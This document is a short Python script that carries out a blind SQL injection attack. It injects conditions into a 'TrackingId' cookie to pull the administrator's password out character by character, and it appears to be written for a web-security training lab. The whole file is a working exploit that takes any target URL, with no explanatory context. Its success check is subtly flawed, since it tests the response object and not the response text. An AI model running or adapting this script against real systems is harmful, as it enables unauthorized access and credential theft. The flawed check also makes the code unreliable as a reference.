import sys
import urllib
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080' }

def sql_payload(base_url):
    password=""
    for i in range(1,21):
        for j in range(32,126):
            payload= f"' and (select ascii(substring(password,{i},1)) from users where username = 'administrator')='{j}'-- "
            # payload= f"' and (select (substring(password,{i},1)) from users where username = 'administrator')='{chr(j)}'-- "
            payload_encoded= urllib.parse.quote(payload)
            cookies= { 'TrackingId':'QRoGQ1Cdk3idzO9R' + payload_encoded, 'session':'dWBGApFYrJaRCWwseo9ylFuyRRy2XuBg'}
            r= requests.get(base_url, cookies=cookies,verify=False, proxies=proxies)
            if 'Welcome' not in r:
                sys.stdout.write ( '\r' + password + chr(j) )
                sys.stdout.flush()
            else:
                password += chr(j)
                sys.stdout.write('\r' + password)
                sys.stdout.flush()
                break
def main():
    try:
        base_url = sys.argv[1]
    except IndexError:
        print("Usage: python script.py <url>")
        sys.exit(-1)
    sql_payload(base_url)
if __name__ == "__main__" :
    main()
